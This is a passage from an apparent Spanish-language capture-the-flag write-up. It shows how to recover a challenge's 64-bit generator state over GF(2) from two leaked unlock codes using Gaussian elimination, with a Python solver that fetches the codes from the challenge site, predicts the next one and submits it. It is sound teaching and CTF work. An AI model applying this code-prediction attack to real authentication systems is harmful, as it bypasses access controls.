0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} \newline
0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \newline
0 0 \color{red}{1} \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \newline
0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} \newline
0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0
\end{pmatrix}
$$</p>
<p>Nótese que estamos operando en el Cuerpo Finito de Galois de dimensión 2 (solamente tenemos 0 y 1). Por tanto, la suma es lo mismo que la operación XOR, y el producto es equivalente a la operación AND.</p>
<p>Vamos a recordar cómo se calcula <code>ret</code> (el código evolutivo que necesitamos para obtener la <em>flag</em>):</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
    <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>  

    <span class=mtk3># Changes in state</span>
</code></pre></div>
<p>Está formado por el bit menos significativo de <code>state</code> en cada iteración. Por tanto, necesitamos la última fila de las matrices $I, A, A^2, A^3, \dots, A^{24}, A^{25}$, que están relacionadas con el último bit del <code>state</code> actual de cada iteración.</p>
<p>La idea es resolver un sistema de ecuaciones de manera que podamos obtener el <code>state</code> actual. Con un código evolutivo, tenemos 26 ecuaciones (ya que el código tiene 26 bits). Aunque <code>state</code> tiene 64 bits, hemos demostrado que por cada cuatro bits, hay dos que tienen el mismo valor (de aquí se sacan 16 ecuaciones). Por tanto, tenemos 48 incógnitas. Luego, para resolver el sistema para un <code>state</code> completo, necesitamos dos códigos evolutivos. Habrá que concatenar estos dos códigos evolutivos y calcular la última fila de las matrices $A^0$ hasta $A^{47}$.</p>
<p>Estas serán algunas de las ecuaciones del sistema que necesitamos resolver (donde $s$ es el <code>state</code> y $r$ y $t$ son los dos códigos evolutivos <code>ret</code>):</p>
<p>$$
\begin{cases}
s_{63} + s_{60} & = & 0 \newline
s_{59} + s_{56} & = & 0 \newline
\dots & = & 0 \newline
s_3 + s_0 & = & 0 \newline
s_0 & = & r_{25} \newline
s_{61} + s_2 & = & r_{24} \newline
\dots & = & \dots \newline
\dots & = & r_0 \newline
\dots & = & t_{25} \newline
\dots & = & \dots \newline
\dots & = & t_5 \newline
\dots & = & t_4 \newline
\end{cases}
$$</p>
<p>Este sistema de ecuaciones puede ser expresado en forma matricial como se muestra a continuación:</p>
<p>$$
M \cdot \begin{pmatrix} s_{63} \newline \dots \newline s_0 \end{pmatrix} = \begin{pmatrix} 0 \newline \overset{(16)}{\dots} \newline 0 \newline r_{25} \newline \dots \newline r_0 \newline t_{25} \newline \dots \newline t_5 \newline t_4 \end{pmatrix}
$$</p>
<p>Donde las filas de $M$ son las 16 primeras ecuaciones en forma matricial y la última fila de las matrices $I, A, A^2, A^3, \dots, A^{47}$.</p>
<p>Para resolver el sistema de ecuaciones, podemos utilizar eliminación Gaussiana sobre el Cuerpo Finito de Galois de dimensión 2 ($\mathbb{F}_2$):</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>gauss_elim</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">b_mat</span><span class=mtk1>):</span>
    <span class=mtk1>aug_mat</span> <span class=mtk5>=</span> <span class=mtk8>add_column</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">b_mat</span><span class=mtk1>)</span>

    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>].copy(),</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>].copy()</span>  
                <span class=mtk5>break</span>

        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>a</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>a</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">zip</span><span class=mtk1>(</span><span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>])]</span>

    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
        <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk1>j</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>):</span>
            <span class=mtk5>if</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]:</span>
                <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>a</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>a</span><span class=mtk1>,</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class="mtk8 mtku">zip</span><span class=mtk1>(</span><span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>],</span> <span class=mtk1>aug_mat</span><span class=mtk1>[</span><span class=mtk1>j</span><span class=mtk1>])]</span>

    <span class=mtk5>return</span> <span class=mtk1>[</span><span class=mtk1>r</span><span class=mtk1>[</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>]</span> <span class=mtk5>for</span> <span class=mtk1>r</span> <span class=mtk5>in</span> <span class=mtk1>aug_mat</span><span class=mtk1>]</span>
</code></pre></div>
<p>El algoritmo de elminación Gaussiana es bastante conocido, por lo que no cabe explicación (lo único que hay que tener en cuenta es que estamos en $\mathbb{F}_2$). Otra manera de resolver el sistema es calculando la inversa de $M$ en $\mathbb{F}_2$, que se puede realizar con SageMath.</p>
<p>De todas maneras, desarrollé un <em>script</em> en Python para resolver esta parte del reto automáticamente:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">re</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">requests</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">sys</span>


<span class=mtk3># Functions and global variables</span>

<span class=mtk1>url</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_code</span><span class=mtk1>():</span>
    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">requests</span><span class=mtk1>.</span><span class=mtk8>post</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>url</span><span class=mtk6>}</span><span class=mtk4>/unlock'</span><span class=mtk1>,</span> <span class=mtk1>{</span><span class=mtk4>'code'</span><span class=mtk1>:</span> <span class=mtk6>1</span><span class=mtk1>})</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">re</span><span class=mtk1>.</span><span class=mtk8>findall</span><span class=mtk1>(</span><span class="mtk7 mtki">r</span><span class=mtk4>'(\d</span><span class=mtk5>+</span><span class=mtk4>)'</span><span class=mtk1>,</span> <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk1>text</span><span class=mtk1>)[</span><span class=mtk6>0</span><span class=mtk1>])</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk5>global</span> <span class=mtk1>state</span>

    <span class=mtk1>code1</span> <span class=mtk5>=</span> <span class=mtk8>get_code</span><span class=mtk1>()</span>
    <span class=mtk1>code2</span> <span class=mtk5>=</span> <span class=mtk8>get_code</span><span class=mtk1>()</span>

    <span class=mtk1>codes</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk4>'0'</span> <span class=mtk5>*</span> <span class=mtk6>16</span> <span class=mtk5>+</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>code1</span><span class="mtk7 mtki">:026b</span><span class=mtk6>}</span><span class=mtk4>'</span> <span class=mtk5>+</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>code2</span><span class="mtk7 mtki">:026b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)[:</span><span class=mtk6>64</span><span class=mtk1>]</span>  
    <span class=mtk1>codes_vector</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class=mtk1>codes</span><span class=mtk1>)))</span>

    <span class=mtk1>comp_state</span> <span class=mtk5>=</span> <span class=mtk8>gauss_elim</span><span class=mtk1>(</span><span class=mtk1>ret_mat</span><span class=mtk1>,</span> <span class=mtk1>codes_vector</span><span class=mtk1>)</span>
    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk4>''</span><span class=mtk1>.</span><span class=mtk8>join</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">str</span><span class=mtk1>,</span> <span class=mtk1>comp_state</span><span class=mtk1>)),</span> <span class=mtk6>2</span><span class=mtk1>)</span>

    <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
    <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
    <span class=mtk1>code3</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>

    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">requests</span><span class=mtk1>.</span><span class=mtk8>post</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{</span><span class=mtk1>url</span><span class=mtk6>}</span><span class=mtk4>/unlock'</span><span class=mtk1>,</span> <span class=mtk1>{</span><span class=mtk4>'code'</span><span class=mtk1>:</span> <span class=mtk1>code3</span><span class=mtk1>})</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk1>text</span><span class=mtk1>)</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<p>Estas funciones toman dos códigos evolutivos del mensaje de error que aparece en la página web y se utilizan para calcular el estado (<code>comp_state</code>), y después calcular el tercer código evolutivo para intentar desbloquear la página y obtener la <em>flag</em>.</p>
<p>La variable <code>ret_mat</code> es la matriz $M$, que se calcula como sigue:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>state_mat_initial</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk6>...</span><span class=mtk1>]</span>
<span class=mtk1>ret_mat</span> <span class=mtk5>=</span> <span class=mtk1>[]</span>

<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">map</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>,</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class=mtk6>{9</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>(</span><span class=mtk6>4</span> <span class=mtk5>*</span> <span class=mtk1>i</span><span class=mtk1>)</span><span class="mtk7 mtki">:064b</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>))))</span>  

<span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>i</span> <span class=mtk5>==</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span> <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>64</span><span class=mtk1>)]</span>

<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>48</span><span class=mtk1>):</span>
    <span class=mtk1>ret_mat</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class=mtk1>state_mat</span><span class=mtk1>[</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>])</span>
    <span class=mtk1>state_mat</span> <span class=mtk5>=</span> <span class=mtk8>multiply_matrix</span><span class=mtk1>(</span><span class=mtk1>state_mat</span><span class=mtk1>,</span> <span class=mtk1>state_mat_initial</span><span class=mtk1>)</span>
</code></pre></div>
<p>Donde <code>state_mat_initial</code> es la matriz $A$ mejorada.</p>
<p>También hay funciones para realizar operaciones en $\mathbb{F}_2$. De nuevo, los algoritmos son bastante conocidos:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>multiply_vector</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>):</span>
    <span class=mtk1>z_vector</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk6>0</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>))]</span>

    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
        <span class=mtk5>for</span> <span class=mtk1>k</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>)):</span>
            <span class=mtk1>z_vector</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>^=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>k</span><span class=mtk1>]</span> <span class=mtk5>&amp;</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>[</span><span class=mtk1>k</span><span class=mtk1>]</span>

    <span class=mtk5>return</span> <span class=mtk1>z_vector</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>multiply_matrix</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>):</span>
    <span class=mtk5>if</span> <span class="mtk8 mtku">type</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>])</span> <span class=mtk5>==</span> <span class="mtk8 mtku">int</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk8>multiply_vector</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>)</span>

    <span class=mtk1>z_mat</span> <span class=mtk5>=</span> <span class=mtk1>[[</span><span class=mtk6>0</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]))]</span> <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>))]</span>  

    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>)):</span>
        <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>])):</span>
            <span class=mtk5>for</span> <span class=mtk1>k</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_mat</span><span class=mtk1>)):</span>
